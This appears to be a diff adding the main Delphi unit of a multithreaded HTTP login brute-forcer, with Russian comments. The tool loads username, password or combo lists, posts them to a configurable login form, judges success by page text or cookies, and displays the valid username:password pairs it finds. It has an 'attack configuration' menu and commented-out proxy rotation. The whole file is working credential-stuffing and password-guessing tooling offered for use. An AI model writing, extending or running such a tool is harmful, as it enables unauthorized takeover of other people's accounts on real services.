@@ -1,0 +1,793 @@
+unit Main;
+
+interface
+
+uses
+  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
+  Dialogs, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient, IdHTTP,
+  StdCtrls, ComCtrls, SyncObjs, RbDrawCore, RbProgressBar, RbButton,
+  Config, Logs, About, Network,
+  Spin, IdAntiFreezeBase, IdAntiFreeze, IdServerIOHandler, IdSSL, IdSSLOpenSSL,
+  IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack, IdCookieManager, Mask,
+  ExtCtrls, IdZLibCompressorBase, IdCompressorZLib, IdIntercept, IdLogBase,
+  IdLogFile, Menus, IdLogDebug, Grids;
+
+type
+  TForm1 = class(TForm)
+    OpenDialog1: TOpenDialog;
+    GroupBox2: TGroupBox;
+    Label4: TLabel;
+    Label6: TLabel;
+    Label1: TLabel;
+    Label2: TLabel;
+    Label12: TLabel;
+    Label7: TLabel;
+    Label9: TLabel;
+    Label10: TLabel;
+    Label11: TLabel;
+    Label13: TLabel;
+    RbProgressBar1: TRbProgressBar;
+    GroupBox4: TGroupBox;
+    Edit2: TEdit;
+    RadioButton2: TRadioButton;
+    Edit6: TEdit;
+    Edit7: TEdit;
+    Label5: TLabel;
+    OpenDialog2: TOpenDialog;
+    IdCookieManager1: TIdCookieManager;
+    IdAntiFreeze1: TIdAntiFreeze;
+    Label19: TLabel;
+    Label20: TLabel;
+    IdHTTP1: TIdHTTP;
+    OpenDialog3: TOpenDialog;
+    Label18: TLabel;
+    Label21: TLabel;
+    Label22: TLabel;
+    Label23: TLabel;
+    MainMenu1: TMainMenu;
+    Action1: TMenuItem;
+    Settings1: TMenuItem;
+    Logs1: TMenuItem;
+    Help1: TMenuItem;
+    About1: TMenuItem;
+    Show1: TMenuItem;
+    Hide1: TMenuItem;
+    Start1: TMenuItem;
+    Pause1: TMenuItem;
+    Continue1: TMenuItem;
+    Stop1: TMenuItem;
+    Exit1: TMenuItem;
+    Edit8: TEdit;
+    Edit9: TEdit;
+    RadioButton3: TRadioButton;
+    AttackConfiguration1: TMenuItem;
+    NetworkSettings1: TMenuItem;
+    CheckBox1: TCheckBox;
+    Label8: TLabel;
+    IdTCPClient1: TIdTCPClient;
+    RadioButton1: TRadioButton;
+    Edit1: TEdit;
+    RadioButton4: TRadioButton;
+    OpenDialog4: TOpenDialog;
+    IdSSLIOHandlerSocketOpenSSL1: TIdSSLIOHandlerSocketOpenSSL;
+    procedure FormCreate(Sender: TObject);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
+    procedure Edit2Click(Sender: TObject);
+    procedure Edit6Click(Sender: TObject);
+    procedure Exit1Click(Sender: TObject);
+    procedure About1Click(Sender: TObject);
+    procedure Show1Click(Sender: TObject);
+    procedure Hide1Click(Sender: TObject);
+    procedure Start1Click(Sender: TObject);
+    procedure Pause1Click(Sender: TObject);
+    procedure Continue1Click(Sender: TObject);
+    procedure Stop1Click(Sender: TObject);
+    procedure Edit9Click(Sender: TObject);
+    procedure AttackConfiguration1Click(Sender: TObject);
+    procedure NetworkSettings1Click(Sender: TObject);
+    procedure RadioButton1Click(Sender: TObject);
+    procedure RadioButton2Click(Sender: TObject);
+    procedure RadioButton3Click(Sender: TObject);
+    procedure IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode;
+      AWorkCount: Int64);
+    procedure Edit1Click(Sender: TObject);
+    procedure RadioButton4Click(Sender: TObject);
+
+  private
+    procedure Start;
+    Procedure Stop;
+    Procedure ExecuteThreads;
+  public
+    Procedure ResetStatistic;
+    Procedure ViewStatistic;
+  end;
+
+type
+  TCounter = record
+    Good: integer;
+    Bad: integer;
+    Remained: integer;
+    Bruted: integer;
+    Skipped: integer;
+    CurrentUsername:string;
+    CurrentPassword:string;
+    AliveThreads: integer;
+    Progress: integer;
+    ProxyOrder: integer;
+  end;
+
+  TNewThread = class(TThread)
+  private
+    Data, Phrase: Tstringlist;
+    HTTP: TIdHTTP;
+    Result: integer;
+//    CurrentProxy: string;
+//    UseProxy: boolean;
+    ThreadExit: boolean;
+  protected
+    procedure Execute; override;
+    procedure HaltCheck;
+    procedure Sync;
+  public
+    constructor Create(CreateSuspended: boolean);
+  end;
+
+var
+  Form1: TForm1;
+  Accounts, Userlist, Passlist, Proxy: Tstringlist;
+  Acc: integer;
+  Work: boolean;
+  CriticalSection: TcriticalSection;
+  //GoodFile, BadFile: textfile;
+  CurrentAcc: integer;
+  WorkMode: TWorkMode;
+  Stopped: boolean;
+  Paused: boolean = false;
+  Index: integer;
+  Counter: TCounter;
+  Thread: array of TNewThread;
+  PswStr, EndPswStr, ChrSet: string; //для пароля
+  CharSet: String;
+  Username: string;
+  Password: string;
+
+ const
+ RusS = 'абвгдеёжзийклмнопрстуфхцчшщъыэьюя';
+ RusB = 'АБВШДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ';
+ Lats = 'abcdefghijklmnopqrstuvwxyz'; //наборы символов
+ Latb = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+ Num = '0123456789';
+ CharSet1: String = 'abcdefghijklmnopqrstuvxwz';
+ CharSet2: String = 'ABCDEFGHIJKLMNOPQRSTUVXWZ';
+ CharSet3: String = '0123456789';
+
+implementation
+
+{$R *.dfm}
+
+
+{function IsAvaliable(URL:string):boolean;
+var H:Tidhttp;
+begin
+ Result:=true;
+ H:=Tidhttp.create;
+ try
+  H.Get(URL);
+ except
+  Result:=false;
+  Work := false;
+  Stopped := True;
+  Form3.Memo1.Lines.Add('Attack stopped.Connection timeout');
+ end;
+ H.Free;
+end;}
+
+function CheckInternetConnection(Host: string='google.ru'; Port: integer=80; Timeout: integer=1000): boolean;
+  var TCP: TIdTCPClient;
+begin
+  TCP:=TIdTCPClient.Create(nil);
+  try
+    TCP.Host:=Host;
+    TCP.Port:=Port;
+    TCP.ConnectTimeout:=Timeout;
+    try
+      TCP.Connect;
+      Result:=TCP.Connected;
+    except
+      Result:=false;
+    end;
+  finally
+    TCP.Free;
+  end;
+end;
+
+/// Процедура избавляет от утечек памяти
+procedure TrimWorkingSet;
+var
+  MainHandle: THandle;
+begin
+  if Win32Platform <> VER_PLATFORM_WIN32_NT then
+    Exit;
+
+  MainHandle := OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessID);
+  SetProcessWorkingSetSize(MainHandle, DWORD(-1), DWORD(-1));
+  CloseHandle(MainHandle);
+end;
+
+constructor TNewThread.Create(CreateSuspended: boolean);
+begin
+  inherited Create(True);
+end;
+
+procedure TForm1.About1Click(Sender: TObject);
+begin
+  Aboutbox.Show;
+end;
+
+procedure TForm1.AttackConfiguration1Click(Sender: TObject);
+begin
+  // Отображаем форму 2 слева от главной.
+  Form2.Show;
+  // Form2.Left := Form1.Left + Form1.Width;
+  Form2.Left := Form1.Left + 10 + Form1.Width;
+  Form2.Top := Form1.Top;
+end;
+
+
+
+
+
+procedure TForm1.Continue1Click(Sender: TObject);
+begin
+  Paused := false; // Возобновить потоки
+  Form1.Stop1.Enabled := True; // включить стоп
+  Form1.Continue1.Enabled := false; // сделать недоступной кнопку возобновления
+  Form1.Pause1.Enabled := True; // включить возможность паузы
+end;
+
+procedure TForm1.Edit1Click(Sender: TObject);
+begin
+  OpenDialog4.InitialDir := ExtractFilePath(Application.ExeName);
+  OpenDialog4.Filter := 'Text files (*.txt)|*.txt|All files (*.*)|*.*';
+  if OpenDialog4.Execute then
+  begin
+    Accounts.Clear;
+    Accounts.LoadFromFile(OpenDialog4.FileName);
+    Label7.Caption := IntToStr(Accounts.Count);
+    Label20.Caption := IntToStr(Accounts.Count);
+    Edit1.text := OpenDialog4.FileName;
+  end;
+end;
+
+procedure TForm1.Edit2Click(Sender: TObject);
+begin
+  OpenDialog1.InitialDir := ExtractFilePath(Application.ExeName);
+  OpenDialog1.Filter := 'Text files (*.txt)|*.txt|All files (*.*)|*.*';
+  if OpenDialog1.Execute then
+  begin
+    Accounts.Clear;
+    Accounts.LoadFromFile(OpenDialog1.FileName);
+    Label7.Caption := IntToStr(Accounts.Count);
+    Label20.Caption := IntToStr(Accounts.Count);
+    Edit2.text := OpenDialog1.FileName;
+  end;
+end;
+
+procedure TForm1.Edit6Click(Sender: TObject);
+begin
+  OpenDialog2.InitialDir := ExtractFilePath(Application.ExeName);
+  OpenDialog2.Filter := 'Text files (*.txt)|*.txt|All files (*.*)|*.*';
+  if OpenDialog2.Execute then
+  begin
+    Accounts.Clear;
+    Accounts.LoadFromFile(OpenDialog2.FileName);
+    Label7.Caption := IntToStr(Accounts.Count);
+    Label20.Caption := IntToStr(Accounts.Count);
+    Edit6.text := OpenDialog2.FileName;
+  end;
+end;
+
+procedure TForm1.Edit9Click(Sender: TObject);
+begin
+  OpenDialog2.InitialDir := ExtractFilePath(Application.ExeName);
+  OpenDialog2.Filter := 'Text files (*.txt)|*.txt|All files (*.*)|*.*';
+  if OpenDialog2.Execute then
+  begin
+    Accounts.Clear;
+    Accounts.LoadFromFile(OpenDialog2.FileName);
+    Label7.Caption := IntToStr(Accounts.Count);
+    Label20.Caption := IntToStr(Accounts.Count);
+    Edit9.text := OpenDialog2.FileName;
+  end;
+end;
+
+procedure TNewThread.Execute;
+begin
+  inherited;
+
+  while Work do
+begin
+    while Paused do // приостановить поток, пока активна пауза
+      sleep(100);
+    if ThreadExit then
+    begin
+      Work := False; //break;
+    end;
+    //CriticalSection.Enter;
+    // inc(Acc);
+    ThreadExit := false;
+    //Synchronize(Method);
+    // if Acc < Accounts.Count or Userlist.Count
+    // then
+   CriticalSection.Enter;
+   Inc(Acc);
+   if Acc<Accounts.Count then CurrentAcc:=Acc else Work:=false;
+   ////////////////////////////////////////////////////////////////////////////////
+        { В этом блоке кода мы задаем условия для работы программы }
+///////////////////////////////////////////////////////////////////////////////
+   if Form1.RadioButton1.Checked then
+   begin
+    Username := Trim(Accounts.Strings[CurrentAcc]);
+    Password := Trim(Form1.Edit7.text);
+   end
+   else
+   if Form1.RadioButton2.Checked then
+begin
+     Username:= Copy(Accounts[CurrentAcc],1,Pos(':',Accounts[CurrentAcc])-1);
+     Password:= Copy(Accounts[CurrentAcc],Pos(':',Accounts[CurrentAcc])+1,Length(Accounts[CurrentAcc]));
+  end
+  else
+   if Form1.RadioButton3.Checked then
+begin
+     Username:= Trim(Form1.Edit8.text);
+     Password:= Trim(Accounts.Strings[CurrentAcc]);
+  end;
+   if Form1.RadioButton4.Checked then
+begin
+     Username:= Trim(Accounts.Strings[CurrentAcc]);
+     Password:= Trim(Accounts.Strings[CurrentAcc]);
+  end;
+     CriticalSection.Leave;
+////////////////////////////////////////////////////////////////////////////////
+ { 1.username берутся из списка и перебираются поочерередно на один password; }
+           { 2.Список username:password, обычный построчный перебор }
+ { 3.username один единственный, а password берется из списка и перебирается }
+               { Функция Trim вырезает ненужные пробелы в строках }
+///////////////////////////////////////////////////////////////////////////////
+ {  if CurrentAcc mod 10 = 0 then
+   UseProxy := True // если прокси загружены, то мы их используем
+   else
+   UseProxy := false;// если нет, то работаем без них}
+ //освобождаем стринглист прокси для работы программы
+///////////////////////////////////////////////////////////////////////////////
+    if Work then
+    begin
+      Synchronize(HaltCheck);
+      // прервать потоки, если переменная истинна
+      Data := Tstringlist.Create;
+      Phrase := Tstringlist.Create;
+     //Username:= Copy(Accounts[CurrentAcc],1,Pos(':',Accounts[CurrentAcc])-1); //Копируем логин
+     //Password:= Copy(Accounts[CurrentAcc],Pos(':',Accounts[CurrentAcc])+1,Length(Accounts[CurrentAcc])); //Копируем пароль
+      // Создаем параметры для post запроса
+      Data.Add('' + Form2.Edit2.text + '=' + Username);
+      Data.Add('' + Form2.Edit3.text + '=' + Password);
+      Data.Add('' + Form2.Edit4.text + '');
+      Data.Add('' + Form2.Edit5.text + '');
+      Data.Add('' + Form2.Edit6.text + '');
+      Data.Add('' + Form2.Edit7.text + '');
+      HTTP := TIdHTTP.Create(nil);
+      Form1.IdCookieManager1 := TIdCookieManager.Create(HTTP);
+      HTTP.CookieManager := Form1.IdCookieManager1;
+///////////////////////////////////////////////////////////////////////////////
+{      if (Proxy.Count > 0) then
+      begin
+      CurrentProxy := Proxy[random(Proxy.Count)];
+      HTTP.ProxyParams.ProxyServer :=
+      Copy(CurrentProxy, 1, Pos(':', CurrentProxy) - 1);
+      HTTP.ProxyParams.ProxyPort :=
+      StrToInt(Copy(CurrentProxy, Pos(':', CurrentProxy) + 1,
+      Length(CurrentProxy)));
+      HTTP.ProxyParams.BasicAuthentication := True;
+      end; }
+
+///////////////////////////////////////////////////////////////////////////////
+      //end
+      // else
+      // begin
+      HTTP.ConnectTimeout := StrToInt(Form4.Edit4.text); // Таймаут соединения
+      HTTP.ReadTimeout := StrToInt(Form4.Edit3.text); // Таймаут чтения
+      // end;
+      HTTP.Request.UserAgent := '' + Form4.Edit6.text + '';
+      HTTP.Request.Referer := '' + Form4.Edit5.text + '';
+      HTTP.Request.ContentType := 'application/x-www-form-urlencoded';
+      HTTP.Request.Connection := 'keep-alive';
+      HTTP.Request.AcceptEncoding := 'gzip, deflate';
+      HTTP.AllowCookies := True;
+      HTTP.HandleRedirects := True;
+      HTTP.IOHandler:=Form1.IdSSLIOHandlerSocketOpenSSL1;
+      //sleep(10);
+      try
+        //
+      //Если отмечен чекбокс и найден верный пароль, то
+      //атака останавливается.Доступно в третьем режиме работы
+        Phrase.text := HTTP.Post('' + Form2.Edit1.text + '', Data);
+        //Result := -1;
+      except
+      end;
+              inc(Counter.Bruted);
+        dec(Counter.Remained);
+        Counter.CurrentUsername:=Trim('' + Username + '');
+        Counter.CurrentPassword:=Trim('' + Password + '');
+
+        if Form2.RadioButton1.Checked = True then
+          if Pos('' + Form2.Edit8.text + '', Phrase.text) <> 0 then
+            Result := 1
+          else
+            Result := 0
+            /// ////
+        else if Form2.RadioButton2.Checked = True then
+          if Pos('' + Form2.Edit9.text + '', Phrase.text) or
+            Pos('' + Form2.Edit12.text + '', Phrase.text) <> 0 then
+            Result := 0
+          else
+            Result := 1
+            /// ////
+        else if Form2.RadioButton3.Checked = True then
+          if Pos('Set-Cookie: ' + Form2.Edit10.text + '',
+            HTTP.Response.RawHeaders.text) <> 0 then
+            Result := 0
+          else
+            Result := 1
+            /// ////
+        else if Form2.RadioButton4.Checked = True then
+          if Pos('Set-Cookie: ' + Form2.Edit11.text + '',
+            HTTP.Response.RawHeaders.text) <> 0 then
+            Result := 1
+          else
+            Result := 0;
+        /// ///////
+      if Form1.CheckBox1.Checked = True then
+      begin
+        if Result = 1 then
+        Begin
+          Work := false;
+          Stopped := True;
+        end;
+
+  end;
+      end;
+              HTTP.Free;
+        /// инициализируем процедуру
+        TrimWorkingSet;
+        Data.Free;
+        Phrase.Free;
+        Synchronize(Sync);
+    end;
+  dec(Counter.AliveThreads);
+  Form1.ViewStatistic;
+  if Counter.AliveThreads <= 1 then
+    Form1.Stop;
+end;
+
+
+procedure TNewThread.HaltCheck;
+begin
+  if Stopped then
+  begin
+    ThreadExit := True;
+  end;
+end;
+
+procedure TNewThread.Sync;
+begin
+  case Result of
+    - 1:
+      begin
+        inc(Counter.Skipped);
+        Form3.Memo1.Lines.Add('Skipped: ' + Username + ':' + Password + '');
+      end;
+    1:
+      begin
+        //Append(GoodFile);
+        // Записываем текущую пару в good.txt.
+        //Writeln(GoodFile, Username + ':' + Password);
+        //Closefile(GoodFile);
+        inc(Counter.Good); // Увеличиваем счетчик good.
+        inc(Counter.Progress);
+        // Отображаем в Memo текущую валидную пару.
+        Form3.Memo1.Lines.Add('' + Username + ':' + Password + '');
+      end;
+    0:
+      begin
+        //Append(BadFile);
+        // Записываем текущую пару в bad.txt.
+        //Writeln(BadFile, Username + ':' + Password);
+        //Closefile(BadFile);
+        inc(Counter.Bad); // Увеличиваем счетчик bad.
+        inc(Counter.Progress);
+        // Отображаем в Memo текущую невалидную пару.
+        //Form3.Memo1.Lines.Add('Bad: ' + Username + ':' + Password + '');
+
+      end;
+  end;
+  Form1.ViewStatistic;
+end;
+
+procedure TForm1.ExecuteThreads;
+var
+  Index: integer;
+begin
+  SetLength(Thread, Form4.UpDown1.Position);
+  // for Index := 0 to Form4.UpDown1.Position - 1 do
+  for Index := 0 to Form4.UpDown1.Position - 1 do
+  begin
+    inc(Counter.AliveThreads);
+    Form1.ViewStatistic;
+    Thread[Index] := TNewThread.Create(True);
+    Thread[Index].FreeOnTerminate := True;
+    // Thread[Index].Resume;
+    Thread[Index].Start;
+  end;
+end;
+
+procedure TForm1.Exit1Click(Sender: TObject);
+begin
+  Application.Terminate;
+  Accounts.Free;
+  Userlist.Free;
+  Proxy.Free;
+  CriticalSection.Free;
+end;
+
+procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
+begin
+  Accounts.Free;
+  Userlist.Free;
+  Passlist.Free;
+  Proxy.Free;
+  CriticalSection.Free;
+end;
+
+procedure TForm1.FormCreate(Sender: TObject);
+begin
+  Accounts := Tstringlist.Create;
+  //Proxy := Tstringlist.Create;
+  CriticalSection := TcriticalSection.Create;
+//  Accounts.NameValueSeparator := ':';
+//  Dict(false);
+//  List(True);
+//  Pass(false);
+end;
+
+procedure TForm1.Hide1Click(Sender: TObject);
+begin
+  Form3.Hide;
+  if Form3.Showing = false then
+    Show1.Enabled := True;
+  Hide1.Enabled := false;
+end;
+
+procedure TForm1.IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode;
+  AWorkCount: Int64);
+begin
+//IsAvaliable('' + Form2.Edit1.text + '');
+end;
+
+procedure TForm1.NetworkSettings1Click(Sender: TObject);
+begin
+  Form4.Show;
+end;
+
+procedure TForm1.Pause1Click(Sender: TObject);
+begin
+  Paused := True; // Поставить потоки на паузу
+  Form1.Stop1.Enabled := false; // сделать недоступным стоп
+  Form1.Pause1.Enabled := false; // сделать недоступной кнопку паузы
+  Form1.Continue1.Enabled := True; // включить возможность возобновления
+end;
+
+procedure TForm1.RadioButton1Click(Sender: TObject);
+begin
+  if Radiobutton1.Checked = True then
+  begin
+    Edit1.text := '';
+    Edit2.text := '';
+    Edit8.text := '';
+    Edit9.text := '';
+
+    Edit1.Enabled := false;
+    Edit6.Enabled := True;
+    Edit7.Enabled := True;
+    Edit2.Enabled := false;
+    Edit8.Enabled := false;
+    Edit9.Enabled := false;
+  end
+  else
+  begin
+    Edit6.Enabled := false;
+    Edit7.Enabled := false;
+  end;
+end;
+
+
+procedure TForm1.RadioButton2Click(Sender: TObject);
+begin
+  if Radiobutton2.Checked = True then
+  begin
+    Edit1.text := '';
+    Edit6.text := '';
+    Edit7.text := '';
+    Edit8.text := '';
+    Edit9.text := '';
+
+    Edit2.Enabled := true;
+    Edit1.Enabled := false;
+    Edit6.Enabled := false;
+    Edit7.Enabled := false;
+    Edit8.Enabled := false;
+    Edit9.Enabled := false;
+  end
+  else
+  begin
+    Edit2.Enabled := false;
+  end;
+end;
+
+procedure TForm1.RadioButton3Click(Sender: TObject);
+begin
+  if Radiobutton3.Checked = True then
+  begin
+    Edit1.text := '';
+    Edit2.text := '';
+    Edit6.text := '';
+    Edit7.text := '';
+
+    Edit6.Enabled := false;
+    Edit7.Enabled := false;
+    Edit2.Enabled := false;
+    Edit1.Enabled := false;
+    Edit8.Enabled := True;
+    Edit9.Enabled := True;
+  end
+  else
+  begin
+    Edit8.Enabled := false;
+    Edit9.Enabled := false;
+  end;
+end;
+
+procedure TForm1.RadioButton4Click(Sender: TObject);
+begin
+  if Radiobutton4.Checked = True then
+  begin
+    Edit2.text := '';
+    Edit6.text := '';
+    Edit7.text := '';
+    Edit8.text := '';
+    Edit9.text := '';
+
+    Edit6.Enabled := false;
+    Edit7.Enabled := false;
+    Edit2.Enabled := false;
+    Edit1.Enabled := True;
+    Edit8.Enabled := false;
+    Edit9.Enabled := false;
+  end
+  else
+  begin
+    Edit1.Enabled := false;
+  end;
+end;
+
+procedure TForm1.ResetStatistic;
+begin
+  Counter.Good := 0;
+  Counter.Bad := 0;
+  Counter.Remained := Accounts.Count;
+  Counter.ProxyOrder := 0;
+  Counter.Bruted := 0;
+  Counter.Progress := 0;
+  Counter.AliveThreads := 0;
+  Counter.CurrentUsername:= 'Null';
+  Counter.CurrentPassword:= 'Null';
+end;
+
+procedure TForm1.Show1Click(Sender: TObject);
+begin
+  Form3.Show;
+  // Form3.Left := Form1.Left + Form1.Width;
+  Form3.Left := Form1.Left + 10 + Form1.Width;
+  Form3.Top := Form1.Top;
+  if Form3.Showing = True then
+    Show1.Enabled := false;
+  Hide1.Enabled := True;
+end;
+
+procedure TForm1.Start;
+begin
+  // Делаем недоступными элементы
+  // во избежание проблем.
+  RadioButton1.Enabled := false;
+  RadioButton2.Enabled := false;
+  RadioButton3.Enabled := false;
+  RadioButton4.Enabled := false;
+  Checkbox1.Enabled := false;
+  Form1.Edit1.Enabled := false;
+  Form1.Edit2.Enabled := false;
+  Form1.Edit6.Enabled := false;
+  Form1.Edit7.Enabled := false;
+  Form1.Edit8.Enabled := false;
+  Form1.Edit9.Enabled := false;
+  Form1.Settings1.Enabled := false;
+  Form1.Start1.Enabled := false;
+  Form1.Pause1.Enabled := True;
+  Form1.Stop1.Enabled := True;
+end;
+
+procedure TForm1.Start1Click(Sender: TObject);
+begin
+  if Form2.Edit1.text = '' then
+    Exit;
+  Stopped := false;
+  Start;
+  ResetStatistic;
+  ViewStatistic;
+  Acc := -1;
+  Work := True;
+    RbProgressBar1.Max := Accounts.Count;
+  ExecuteThreads;
+end;
+
+procedure TForm1.Stop;
+begin
+  RadioButton1.Enabled := True;
+  RadioButton2.Enabled := True;
+  RadioButton3.Enabled := True;
+  RadioButton4.Enabled := True;
+  Form1.Settings1.Enabled := True;
+  Form1.Start1.Enabled := True;
+  Form1.Pause1.Enabled := false;
+  Form1.Stop1.Enabled := false;
+  if RadioButton1.Checked then
+  begin
+    Edit6.Enabled := True;
+    Edit7.Enabled := True;
+  end;
+  if RadioButton2.Checked then
+  begin
+    Edit2.Enabled := True;
+  end;
+  if RadioButton3.Checked then
+  begin
+    Edit8.Enabled := True;
+    Edit9.Enabled := True;
+  end;
+  if RadioButton4.Checked then
+  begin
+    Edit1.Enabled := True;
+  end;
+   Checkbox1.Enabled := True;
+end;
+
+procedure TForm1.Stop1Click(Sender: TObject);
+begin
+  // CriticalSection.Enter;
+  Work := false;
+  Stopped := True;
+  // CriticalSection.Leave;
+end;
+
+procedure TForm1.ViewStatistic;
+begin
+  Label9.Caption := IntToStr(Counter.Bruted); // bruted
+  Label20.Caption := IntToStr(Counter.Remained); // remained
+  Label10.Caption := IntToStr(Counter.Good); // good
+  Label11.Caption := IntToStr(Counter.Bad); // bad
+  RbProgressBar1.Position := Counter.Progress;
+  //Label21.Caption := Proxy[random(Proxy.Count)]; // current proxy
+  Label13.Caption := IntToStr(Counter.AliveThreads); // alive threads
+  Label23.Caption := Counter.CurrentUsername; // current uname
+  Label8.Caption := Counter.CurrentPassword; // current pwd
+end;
+
+end.
